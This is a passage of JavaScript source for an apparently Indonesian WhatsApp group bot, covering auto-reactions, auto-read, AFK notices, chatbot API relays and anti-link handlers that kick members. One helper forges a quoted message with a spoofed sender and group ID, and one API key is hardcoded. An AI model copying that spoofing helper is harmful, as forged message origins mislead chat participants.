                if (!('templateImage' in setting)) setting.templateImage = true
                if (!('templateVideo' in setting)) setting.templateVideo = false
                if (!('templateGif' in setting)) setting.templateGif = false
                if (!('templateMsg' in setting)) setting.templateMsg = false
                if (!('templateLocation' in setting)) setting.templateLocation = false
            } else global.db.data.settings[botNumber] = {
                status: 0,
                restartDB: 0,
                tanpacall: true,
                autobio: false,
                autoread: true,
                modebot23: true,
                templateImage: true,
                templateVideo: false,
                templateGif: false,
                templateMsg: false,
                templateLocation: false,
            }
let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antilinkall' in chats)) chats.antilinkall = false
                if (!('antiwame' in chats)) chats.antiwame = false
                if (!('antilinkvid' in chats)) chats.antilinkvid = false
                if (!('antilinkch' in chats)) chats.antilinkch = false
                if (!('antilinkig' in chats)) chats.antilinkig = false
                if (!('antilinkfb' in chats)) chats.antilinkfb = false
                if (!('antilinktg' in chats)) chats.antilinktg = false
                if (!('antilinktt' in chats)) chats.antilinktt = false
                if (!('antilinktwt' in chats)) chats.antilinktwt = false
                if (!('antivirtex' in chats)) chats.antivirtex = false
                if (!('antipanel' in chats)) chats.antipanel = false
                if (!('autoai' in chats)) chats.autoai = false
                if (!('simiprib' in chats)) chats.simiprib = false
                if (!('autosimi' in chats)) chats.autosimi = false
                if (!('autosticker' in chats)) chats.autosticker = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
                antilinkall: false,
                antiwame: false,
                antilinkvid: false,
                antilinkch: false,
                antilinkig: false,
                antilinkfb: false,
                antilinktg: false,
                antilinktt: false,
                antilinktwt: false,
                antivirtex: false,
                antipanel: false,
                autoai: false,
                simiprib: false,
                autosimi: false,
                autosticker: false,
            }
let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
            }
          } catch (err) {
         console.error(err)
}
//=================================================//

//=================================================//
// Pelengkap File
//=================================================//
const isSticker = (m.mtype == 'stickerMessage')
const isAudio = (m.mtype == 'audioMessage')
const isText = (m.mtype == 'conversation')
const isReaction = (m.mtype == 'reactionMessage')
const isViewOnce = (m.mtype == 'viewOnceMessage')
const isImage = (m.type === 'imageMessage')
const isVideo = (m.type === 'videoMessage')
const isMedias = (m.mtype === 'imageMessage' || m.mtype === 'videoMessage')
const isAllMedia = (m.mtype === 'imageMessage' || m.mtype === 'videoMessage' || m.mtype === 'stickerMessage' || m.mtype === 'audioMessage' || m.mtype === 'contactMessage' || m.mtype === 'locationMessage')
//=====//
		const isQuotedImage = m.mtype === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = m.mtype === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = m.mtype === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedLoca = m.mtype === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedContact = m.mtype === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocs = m.mtype === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedTeks = m.mtype === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = m.mtype === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedProd = m.mtype === 'extendedTextMessage' && content.includes('productMessage')
        const isQuotedReply = m.mtype === 'extendedTextMessage' && content.includes('Message')
        const isQuotedText = m.mtype === 'extendedTextMessage' && content.includes('conversation')
        const isQuotedViewOnce = m.mtype === 'extendedTextMessage' && content.includes('viewOnceMessage')
//=================================================//

//=================================================//
// Tipe Media Dan Chat Dalam Ruang
//=================================================//
  var media = ["imageMessage", "videoMessage", "audioMessage", "stickerMessage", "documentMessage"].includes(type);
  var voice = content.includes("audioMessage") && content.includes('ptt":true');
  var music = content.includes("audioMessage") && content.includes('ptt":false');
  var img = content.includes("imageMessage");
  var sticker = content.includes("stickerMessage");
  var video = content.includes("videoMessage");
  var giffromwa = content.includes('"gifAttribution":"GIPHY"');
  var gif = content.includes('"gifPlayback":true');
  var quotedM = type === "extendedTextMessage" && content.includes("quotedMessage");
  var vcard = content.includes("contactMessage");
  var multipleVcard = content.includes("contactsArrayMessage");
  var liveLocation = content.includes("liveLocationMessage");
  var location = content.includes("locationMessage");
  var document = content.includes("documentMessage");
  var product = content.includes("productMessage");
  var forwarded = content.includes("forwardingScore");
  var requestPayment = content.includes("requestPaymentMessage");
  var sendPayment = content.includes("sendPaymentMessage");
  var cancelPayment = content.includes("cancelPaymentRequestMessage");
  var templateButtonReplyMessage = content.includes("templateButtonReplyMessage");
  var buttonsResponseMessage = content.includes("buttonsResponseMessage");
  var singleselectlist = content.includes("singleSelectReply");
  var docJS = document && content.includes("text/javascript");
  var docJson = document && content.includes("application/json");
  var docPdf = document && content.includes("application/pdf");
  var docWordDoc = document && content.includes("application/vnd.openxmlformats-officedocument.wordprocessingml.document");
  var docHTML = document && content.includes("text/html");
  var docIMG = document && content.includes('"mimetype":"image/');
//=================================================//

//=================================================//
         // Auto Reaksi Saat Mengirim Emoji \\
//=================================================//
        if (m.text.includes('😍')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🗿',
            key: m.key
          }})
        }
        if (m.text.includes('🥰')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🗿',
            key: m.key
          }})
        }
         if (m.text.includes('😜')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🙄',
            key: m.key
          }})
        }
         if (m.text.includes('🥺')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤔',
            key: m.key
          }})
        }
         if (m.text.includes('😫')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤔',
            key: m.key
          }})
        }
         if (m.text.includes('😈')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '😾',
            key: m.key
          }})
        }
        if (m.text.includes('💀')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '👀',
            key: m.key
          }})
        }
        if (m.text.includes('😁')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '😀',
            key: m.key
          }})
        }
        if (m.text.includes('🤔')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤔',
            key: m.key
          }})
        }
        if (m.text.includes('🗣️')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '📝',
            key: m.key
          }})
        }
        if (m.text.includes('😅')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '😂',
            key: m.key
          }})
        }
        if (m.text.includes('😂')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤣',
            key: m.key
          }})
        }
        if (m.text.includes('🙄')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤔',
            key: m.key
          }})
        }
        if (m.text.includes('🤣')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '😭',
            key: m.key
          }})
        }
         if (m.text.includes('🙏🏻')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤝🏻',
            key: m.key
          }})
        }
        if (m.text.includes('🥹')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🗿',
            key: m.key
          }})
        }
         if (m.text.includes('👄')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🗿',
            key: m.key
          }})
        }
         if (m.text.includes('🐦‍⬛')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '😏',
            key: m.key
          }})
        }
        if (m.text.includes('😱')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '👻',
            key: m.key
          }})
        }
        if (m.text.includes('😅')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '😁',
            key: m.key
          }})
        }
        if (m.text.includes('😘')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🌝',
            key: m.key
          }})
        }
        if (m.text.includes('😭')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤔',
            key: m.key
          }})
        }
        if (m.text.includes('😏')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🗿',
            key: m.key
          }})
        }
        if (m.text.includes('🤛🏻')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤜🏻',
            key: m.key
          }})
        }
        if (m.text.includes('🤜🏻')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🤛🏻',
            key: m.key
          }})
        }
         if (m.text.includes('🐦')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🐦',
            key: m.key
          }})
        }
        if (m.text.includes('😇')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '😘',
            key: m.key
          }})
        }
        if (m.text.includes('👍🏻')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '👍🏻',
            key: m.key
          }})
        }
        if (m.text.includes('🐧')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🐧',
            key: m.key
          }})
        }
        if (m.text.includes('🗿')) {
    tganz.sendMessage(m.chat, {
          react: {
            text: '🗿',
            key: m.key
          }})
        }
//=================================================//

//=================================================//
             // Otomatis Pergantian Bio \\
//=================================================//
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await tganz.setStatus(`👁️‍🗨️ SS³• EagleM`)
		setting.status = new Date() * 1
	    }
	}
//=================================================//
      
  // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: tganz.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, tganz.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        tganz.ev.emit('messages.upsert', msg)
        }
   //=======================================================//
                      // Waktu - System Bot \\
   //=======================================================//
const hours = timeZone().tz('Asia/Jakarta').format('HH:mm:ss')
        if(hours < "23:59:00"){
        var sayyingTime = 'Selamat Malam 🌃'
}
        if(hours < "19:00:00"){
        var sayyingTime = 'Selamat Petang 🌆'
}
        if(hours < "18:00:00"){
        var sayyingTime = 'Selamat Sore 🌅'
}
        if(hours < "15:00:00"){
        var sayyingTime = 'Selamat Siang 🏙'
}
        if(hours < "10:00:00"){
        var sayyingTime = 'Selamat Pagi 🌄'
}
        if(hours < "05:00:00"){
        var sayyingTime = 'Selamat Subuh 🌉'
}
        if(hours < "03:00:00"){
        var sayyingTime = 'Selamat Tengah Malam 🌌'
}
   //=======================================================//
   
   //=======================================================//
                    /* { participant mentions } */   
   //=======================================================//

   const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
   const mentionByreply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""       
   const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
          mention != undefined ? mention.push(mentionByreply) : []
          
//=======================================================\\
 // Auto - Reading for all message !!!
   if (!body && !chatmessage && m.message) {
      if (global.db.data.settings[botNumber].autoread) {
      tganz.readMessages([m.key])
   }
}
          // autoread all
  if (global.autoReadAll) { 
  if (m.chat) { 
  tganz.readMessages(m.chat, m.sender, [m.key.id]) }
}
          // autoreader gc and pm
if (global.autoreadpmngc) {
if (command) {
await tganz.sendPresenceUpdate('composing', m.chat)
tganz.readMessages(from, m.sender, [m.key.id])}
}
         // auto read whatsapp status
if (autoreadsw) {
		if (from === 'status@broadcast') {
		tganz.chatRead(from)
	}
	}
	       // auto read whatsapp status
if (autoreadsw) {
		if (from === 'status@broadcast') {
		tganz.sendPresenceUpdate('available', from)
	}
	}
          // autoread gc chat
  if (global.autoReadGc) {
  if (m.isGroup) { tganz.readMessages(m.chat, m.sender, [m.key.id]) }
}
          // autoread private chat
  if (global.autoReadPc) {
  if (m.isPrivate) { tganz.readMessages(m.chat, m.sender, [m.key.id]) }
}
           // auto available all
    if (global.available) { if (m.chat) { tganz.sendPresenceUpdate('available', m.chat) }
}
           // auto Record
    if (global.autoRecord) { if (m.chat) { tganz.sendPresenceUpdate('recording', m.chat) }
}
         // Auto Typing
  if (global.autoTyping) { if (m.chat) { tganz.sendPresenceUpdate('composing', m.chat) }
}
          // Auto Read
if(m.message && global.autoread == true) {
tganz.readMessages(m.chat, m.sender, [m.key.id])
}
         // Auto Read2
if(!isMedia && global.autoread == true) {
tganz.readMessages(m.chat, m.sender, [m.key.id])
}
//=======================================================//

//=======================================================\\
                   // Automatic Message \\
//=======================================================\\
     // Auto - Simi • PC
         if (db.data.chats[m.chat].simiprib) {
         if (!quoted) throw budy
    axios.get(`https://api.lolhuman.xyz/api/simi?apikey=${lolkeysapi}&text=${body}&badword=true`).then(({ data }) => {
				m.reply(`\n${data.result}\n`)
		   	})
    }
    
     // Auto - OpenAI • GC
         if (db.data.chats[m.chat].autoai) {
         if (!quoted) throw body
    axios.get(`https://api.lolhuman.xyz/api/openai-turbo?apikey=kocheng&text=${budy + body}&system=Aku Jawab Ya&Baik&Soal&Full&Pertanyaannya&Ramah&Open-AI&Jawab&Indonesia&Pintar&Ceria&Tampil&Cerdas&Dewasa&Hebat&Modern&Keagamaan&Dunia$Abjad&Tahun&user=user-unique-id`).then(({ data }) => {
				m.reply(`\n${data.result}\n`)
			})
    }
    
        // Auto - Simi • GC
         if (db.data.chats[m.chat].autosimi) {
         if (!quoted) throw budy
         axios.get(`https://api.lolhuman.xyz/api/simi?apikey=${lolkeysapi}&text=${body}&badword=true`).then(({ data }) => {
				m.reply(`\n${data.result}\n`)
		   	})
    }
    
       // Auto - Sticker • GC
         if (db.data.chats[m.chat].autosticker) {
         if (!quoted) return
         if (/image/.test(mime)) {
         let media = await quoted.download()
         let encmedia = await tganz.sendImageAsSticker(m.chat, media, m, {
                  packname: global.packname,
                  author: global.author
              })
             await fs.unlinkSync(encmedia)
             } else if (/video/.test(mime)) {
         let media = await quoted.download()
         let encmedia = await tganz.sendVideoAsSticker(m.chat, media, m, {
                  packname: global.packname,
                  author: global.author
              })
             await fs.unlinkSync(encmedia)
           }
        }
//=======================================================//

//=====================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
        for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
*🗣️ Jᴀɴɢᴀɴ ᴛᴀɢ ᴅɪᴀ ᴋᴀᴋ !!!*
════════════════❑
❑ Dɪᴀ sᴇᴅᴀɴɢ AFK !
❑ Dᴇɴɢᴀɴ ᴀʟᴀsᴀɴ : ${reason ? '' + reason : '*Tidak Diketahui 🤷*'}
❑ AFK sᴇʟᴀᴍᴀ : ${clockString(new Date - afkTime)}
════════════════❑`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
*🗣️ Hᴀɪ ᴋᴀᴋᴀᴋ :* ⟨ ${m.pushName} ⟩ 🙌🏻
═══════════════════❑
❑ Kᴀᴍᴜ ʙᴀʀᴜ sᴀᴊᴀ ʙᴇʀʜᴇɴᴛɪ AFK !!!
❑ Dᴇɴɢᴀɴ ᴀʟᴀsᴀɴ : ${user.afkReason ? '' + user.afkReason : '*Tidak Diketahui 🤷*'}
❑ Tᴇʟᴀʜ AFK sᴇʟᴀᴍᴀ : ${clockString(new Date - user.afkTime)}
═══════════════════❑
⫹⫺ Sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴋᴇᴍʙᴀʟɪ ᴋᴀᴋᴀᴋ !!!
╚❑ Sᴇᴍᴏɢᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴍᴇʀɪɴᴅᴜᴋᴀɴ ᴍᴜ ^~^`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
//=====================//


      //===================⟨ Reply - Message ⟩=====================\\
        const reply = (teks) => {
            tganz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.ttname}`,"body": `❑ ᴋʟɪᴋ ᴅᴀɴ ᴊᴏɪɴ ɢʀᴜᴘ ᴀᴋᴜ ^~^`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./image/foto.jpg`),"sourceUrl": "https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz"}}}, { quoted: m})
        }
        const anjay = (teks) => {
            tganz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.ttname}`,"body": `❑ ᴋʟɪᴋ ᴅᴀɴ ᴊᴏɪɴ ɢʀᴜᴘ ᴀᴋᴜ ^~^`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./image/foto.jpg`),"sourceUrl": "https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz"}}}, { quoted: m})
        }
        const replay = (teks) => {
            tganz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.ttname}`,"body": `❑ ᴋʟɪᴋ ᴅᴀɴ ᴊᴏɪɴ ɢʀᴜᴘ ᴀᴋᴜ ^~^`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./image/foto.jpg`),"sourceUrl": "https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz"}}}, { quoted: m})
        }
      //========================================================\\
      
        const sendMess = (hehe, teks) => {
		        		tganz.sendMessage(hehe, teks, text)
      		}
        const tempButton = async (remoteJid, text, footer, content) => {
      // const { displayText, url, contentText, footer } = content
      //send a template message!
      const templateMessage = {
        viewOnceMessage: {
          message: {
            templateMessage: {
              hydratedTemplate: {
                hydratedContentText: text,
                hydratedContentFooter: footer,
                hydratedButtons: content,
              },
            },
          },
        },
      };
      const sendMsg = await tganz.relayMessage(remoteJid, templateMessage, {});
    };
        const sticSukses = (hehe) => {
          ano = fs.readFileSync('./src/SuksesBro.webp')
         tganz.sendImageAsSticker(from, ano, m, { packname: global.packname, author: global.author })
        }
      const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    tganz.sendMessage(to, media, type, { quoted: m, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }
       const fakegroup = (teks) => {
            tganz.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./image/foto.jpg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const getStyle = (style, style2) => {
            let listt = `*${style2} Yg Kamu Masukkan Salah*\n\n_Berikut List ${style2} Yg Benar, Total_ *${style}* _${style2}_\n\n`
            no = 0
            for (var i = 0; i < style.length; i++) {
                no += 1
                listt += no.toString() + '.  ' + style[i] + '\n'
            }
            reply(listt)
        }
        if (m.message) {
            tganz.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Chat Pribadi', from))
        }
        
          	  // Anti Link
if (db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
m.reply(`\`\`\`「 ANTI LINK 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${m.sender.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ !!!*`)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let gclink = (`https://chat.whatsapp.com/`+await tganz.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Hᴀɪ ᴋᴀᴋ, Kᴀᴍᴜ ᴛɪᴅᴀᴋ ᴊᴀᴅɪ ᴅɪ ᴋɪᴄᴋ ᴋᴀʀᴇɴᴀ ʟɪɴᴋ ʏᴀɴɢ ᴋᴀᴍᴜ ʙᴇʀɪᴋᴀɴ ᴛᴇʀᴍᴀsᴜᴋ ʟɪɴᴋ ɢʀᴜᴘ ɪɴɪ ᴊᴀᴅɪ ᴀᴍᴀɴ !*`)
if (isAdmins) return m.reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`)
if (isCreator) return m.reply(`\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`)
tganz.sendMessage(m.chat, { delete: m.key })
tganz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

          // AntiLink Semua Medsos
if (db.data.chats[m.chat].antilinkall)
if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI LINK MEDSOS 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴀʟʟ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
        // Antiwame
  if (db.data.chats[m.chat].antiwame)
  if (budy.includes(`wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI WA-ME 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪᴡᴀᴍᴇ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
  if (db.data.chats[m.chat].antiwame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 INFO LANJUT 」\`\`\`\n\n*Kᴀᴍᴜ ᴀᴅᴍɪɴ ᴊᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴅᴍɪɴ ᴘᴇɴɢᴜᴀsᴀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
tganz.sendMessage(m.chat, { delete: m.key })
await tganz.groupParticipantsUpdate(m.chat, [kice], 'remove')
tganz.sendMessage(from, {text:`\`\`\`「 ANTI WA-ME 」\`\`\`\n\nHᴀɪ ᴋᴀᴋ : ⟨ @${kice.split("@")[0]} ⟩\n*Kᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴋᴀʀᴇɴᴀ ᴛᴇʟᴀʜ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴛᴇᴛᴀᴘᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ʏᴀɪᴛᴜ ᴀᴅᴍɪɴ ᴛᴇʟᴀʜ  ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪᴡᴀᴍᴇ !!!*`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
  if (db.data.chats[m.chat].antiwame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
